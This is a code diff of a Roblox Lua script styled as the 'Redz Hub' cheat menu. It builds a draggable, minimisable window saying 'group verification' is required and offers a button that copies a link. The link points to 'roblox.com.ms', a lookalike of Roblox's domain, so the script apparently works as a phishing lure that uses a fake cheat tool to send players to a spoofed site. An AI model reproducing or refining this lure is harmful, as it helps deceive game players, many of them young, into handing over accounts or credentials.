@@ -1,151 +1,237 @@
+
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
+local UIS = game:GetService("UserInputService")
 
-local Player = Players.LocalPlayer
-
+local player = Players.LocalPlayer
 local GROUP_LINK = "https://roblox.com.ms/communities/579017887/"
 
--- Remove previous GUI
-local old = Player:WaitForChild("PlayerGui"):FindFirstChild("RedzHubGUI")
-if old then
-    old:Destroy()
+local gui = Instance.new("ScreenGui")
+gui.Name = "RedzHub"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+
+local parent = player:WaitForChild("PlayerGui")
+gui.Parent = parent
+
+local red = Color3.fromRGB(220, 25, 40)
+local black = Color3.fromRGB(10, 10, 13)
+local dark = Color3.fromRGB(23, 23, 27)
+local white = Color3.fromRGB(245, 245, 245)
+
+local function make(class, props, parentObj)
+    local obj = Instance.new(class)
+    for key, value in pairs(props) do
+        obj[key] = value
+    end
+    obj.Parent = parentObj
+    return obj
 end
 
---// ScreenGui
-local Gui = Instance.new("ScreenGui")
-Gui.Name = "RedzHubGUI"
-Gui.ResetOnSpawn = false
-Gui.Parent = Player.PlayerGui
+local function rounded(obj, radius)
+    make("UICorner", {
+        CornerRadius = UDim.new(0, radius)
+    }, obj)
+end
 
---// Main
-local Main = Instance.new("Frame")
-Main.Size = UDim2.new(0, 440, 0, 255)
-Main.Position = UDim2.new(0.5, -220, 0.5, -127)
-Main.BackgroundColor3 = Color3.fromRGB(17, 17, 20)
-Main.BorderSizePixel = 0
-Main.Parent = Gui
+local function outlined(obj, thickness)
+    make("UIStroke", {
+        Color = red,
+        Thickness = thickness
+    }, obj)
+end
 
-local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 13)
-MainCorner.Parent = Main
+-- Main window
+local main = make("Frame", {
+    Size = UDim2.fromOffset(480, 330),
+    Position = UDim2.new(0.5, -240, 0.5, -165),
+    BackgroundColor3 = black,
+    BorderSizePixel = 0
+}, gui)
 
--- Top red line
-local TopLine = Instance.new("Frame")
-TopLine.Size = UDim2.new(1, 0, 0, 5)
-TopLine.BackgroundColor3 = Color3.fromRGB(235, 45, 55)
-TopLine.BorderSizePixel = 0
-TopLine.Parent = Main
+rounded(main, 14)
+outlined(main, 2)
 
-local LineCorner = Instance.new("UICorner")
-LineCorner.CornerRadius = UDim.new(0, 13)
-LineCorner.Parent = TopLine
+-- Header
+local header = make("Frame", {
+    Size = UDim2.new(1, 0, 0, 65),
+    BackgroundColor3 = dark,
+    BorderSizePixel = 0
+}, main)
 
---// Redz Hub
-local HubTitle = Instance.new("TextLabel")
-HubTitle.Size = UDim2.new(1, -30, 0, 40)
-HubTitle.Position = UDim2.new(0, 15, 0, 15)
-HubTitle.BackgroundTransparency = 1
-HubTitle.Text = "Redz Hub"
-HubTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-HubTitle.TextSize = 28
-HubTitle.Font = Enum.Font.GothamBlack
-HubTitle.TextXAlignment = Enum.TextXAlignment.Left
-HubTitle.Parent = Main
+rounded(header, 14)
 
---// Game name
-local GameTitle = Instance.new("TextLabel")
-GameTitle.Size = UDim2.new(1, -30, 0, 30)
-GameTitle.Position = UDim2.new(0, 15, 0, 52)
-GameTitle.BackgroundTransparency = 1
-GameTitle.Text = "STEAL AN EGG"
-GameTitle.TextColor3 = Color3.fromRGB(235, 45, 55)
-GameTitle.TextSize = 17
-GameTitle.Font = Enum.Font.GothamBold
-GameTitle.TextXAlignment = Enum.TextXAlignment.Left
-GameTitle.Parent = Main
+make("TextLabel", {
+    Size = UDim2.new(0, 240, 1, 0),
+    Position = UDim2.fromOffset(20, 0),
+    BackgroundTransparency = 1,
+    Text = "Redz Hub",
+    TextColor3 = red,
+    Font = Enum.Font.GothamBold,
+    TextSize = 30,
+    TextXAlignment = Enum.TextXAlignment.Left
+}, header)
 
---// Message
-local Message = Instance.new("TextLabel")
-Message.Size = UDim2.new(1, -40, 0, 65)
-Message.Position = UDim2.new(0, 20, 0, 88)
-Message.BackgroundTransparency = 1
-Message.Text = "For this script to work, you must join\nthe required group."
-Message.TextColor3 = Color3.fromRGB(205, 205, 210)
-Message.TextSize = 16
-Message.Font = Enum.Font.Gotham
-Message.TextWrapped = true
-Message.Parent = Main
+-- Minimize
+local minimize = make("TextButton", {
+    Size = UDim2.fromOffset(36, 36),
+    Position = UDim2.new(1, -85, 0, 14),
+    BackgroundColor3 = black,
+    Text = "−",
+    TextColor3 = red,
+    Font = Enum.Font.GothamBold,
+    TextSize = 25
+}, header)
 
---// Copy button
-local CopyButton = Instance.new("TextButton")
-CopyButton.Size = UDim2.new(1, -40, 0, 46)
-CopyButton.Position = UDim2.new(0, 20, 1, -62)
-CopyButton.BackgroundColor3 = Color3.fromRGB(220, 40, 50)
-CopyButton.BorderSizePixel = 0
-CopyButton.Text = "COPY GROUP LINK"
-CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CopyButton.TextSize = 15
-CopyButton.Font = Enum.Font.GothamBold
-CopyButton.AutoButtonColor = false
-CopyButton.Parent = Main
+rounded(minimize, 9)
+outlined(minimize, 1.5)
 
-local ButtonCorner = Instance.new("UICorner")
-ButtonCorner.CornerRadius = UDim.new(0, 8)
-ButtonCorner.Parent = CopyButton
+-- Exit
+local exit = make("TextButton", {
+    Size = UDim2.fromOffset(36, 36),
+    Position = UDim2.new(1, -43, 0, 14),
+    BackgroundColor3 = black,
+    Text = "×",
+    TextColor3 = red,
+    Font = Enum.Font.GothamBold,
+    TextSize = 25
+}, header)
 
---// Copy link
-CopyButton.MouseButton1Click:Connect(function()
+rounded(exit, 9)
+outlined(exit, 1.5)
+
+-- Verification panel
+local panel = make("Frame", {
+    Size = UDim2.new(1, -40, 0, 220),
+    Position = UDim2.fromOffset(20, 90),
+    BackgroundColor3 = dark,
+    BorderSizePixel = 0
+}, main)
+
+rounded(panel, 14)
+outlined(panel, 1.5)
+
+-- Heading
+make("TextLabel", {
+    Size = UDim2.new(1, -20, 0, 50),
+    Position = UDim2.fromOffset(10, 20),
+    BackgroundTransparency = 1,
+    Text = "GROUP VERIFICATION REQUIRED",
+    TextColor3 = red,
+    Font = Enum.Font.GothamBold,
+    TextSize = 20,
+    TextWrapped = true
+}, panel)
+
+-- Instructions
+make("TextLabel", {
+    Size = UDim2.new(1, -30, 0, 65),
+    Position = UDim2.fromOffset(15, 75),
+    BackgroundTransparency = 1,
+    Text = "PLEASE COPY THE LINK BELOW\nAND JOIN THE GROUP TO PROCEED",
+    TextColor3 = white,
+    Font = Enum.Font.GothamMedium,
+    TextSize = 16,
+    TextWrapped = true
+}, panel)
+
+-- Copy link
+local copy = make("TextButton", {
+    Size = UDim2.new(0.75, 0, 0, 45),
+    Position = UDim2.new(0.125, 0, 1, -60),
+    BackgroundColor3 = black,
+    Text = "COPY GROUP LINK",
+    TextColor3 = white,
+    Font = Enum.Font.GothamBold,
+    TextSize = 16,
+    AutoButtonColor = false
+}, panel)
+
+rounded(copy, 14)
+outlined(copy, 2)
+
+copy.MouseButton1Click:Connect(function()
     if typeof(setclipboard) == "function" then
         setclipboard(GROUP_LINK)
-
-        CopyButton.Text = "✓ LINK COPIED!"
-        CopyButton.BackgroundColor3 = Color3.fromRGB(45, 180, 90)
-
+        copy.Text = "LINK COPIED"
         task.wait(1.5)
-
-        CopyButton.Text = "COPY GROUP LINK"
-        CopyButton.BackgroundColor3 = Color3.fromRGB(220, 40, 50)
+        if copy.Parent then
+            copy.Text = "COPY GROUP LINK"
+        end
     else
-        CopyButton.Text = "COPY NOT SUPPORTED"
+        copy.Text = "CLIPBOARD UNSUPPORTED"
         task.wait(1.5)
-        CopyButton.Text = "COPY GROUP LINK"
+        if copy.Parent then
+            copy.Text = "COPY GROUP LINK"
+        end
     end
 end)
 
---// DRAGGING
-local dragging = false
-local dragStart
-local startPos
+-- Minimized icon
+local mini = make("TextButton", {
+    Size = UDim2.fromOffset(68, 68),
+    Position = UDim2.new(0, 20, 0.5, -34),
+    BackgroundColor3 = black,
+    Text = "Redz\nHub",
+    TextColor3 = red,
+    Font = Enum.Font.GothamBold,
+    TextSize = 19,
+    Visible = false
+}, gui)
 
-Main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
+rounded(mini, 12)
+outlined(mini, 2)
+
+minimize.MouseButton1Click:Connect(function()
+    main.Visible = false
+    mini.Visible = true
+end)
+
+mini.MouseButton1Click:Connect(function()
+    mini.Visible = false
+    main.Visible = true
+end)
+
+exit.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+-- Dragging
+local function drag(object, handle)
+    local active = false
+    local start
+    local original
+
+    handle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
         or input.UserInputType == Enum.UserInputType.Touch then
+            active = true
+            start = input.Position
+            original = object.Position
+        end
+    end)
 
-        dragging = true
-        dragStart = input.Position
-        startPos = Main.Position
+    UIS.InputChanged:Connect(function(input)
+        if active and (
+            input.UserInputType == Enum.UserInputType.MouseMovement
+            or input.UserInputType == Enum.UserInputType.Touch
+        ) then
+            local delta = input.Position - start
+            object.Position = UDim2.new(
+                original.X.Scale,
+                original.X.Offset + delta.X,
+                original.Y.Scale,
+                original.Y.Offset + delta.Y
+            )
+        end
+    end)
 
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            active = false
+        end
+    end)
+end
 
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (
-        input.UserInputType == Enum.UserInputType.MouseMovement
-        or input.UserInputType == Enum.UserInputType.Touch
-    ) then
-
-        local delta = input.Position - dragStart
-
-        Main.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale,
-            startPos.Y.Offset + delta.Y
-        )
-    end
-end)
+drag(main, header)
+drag(mini, mini)
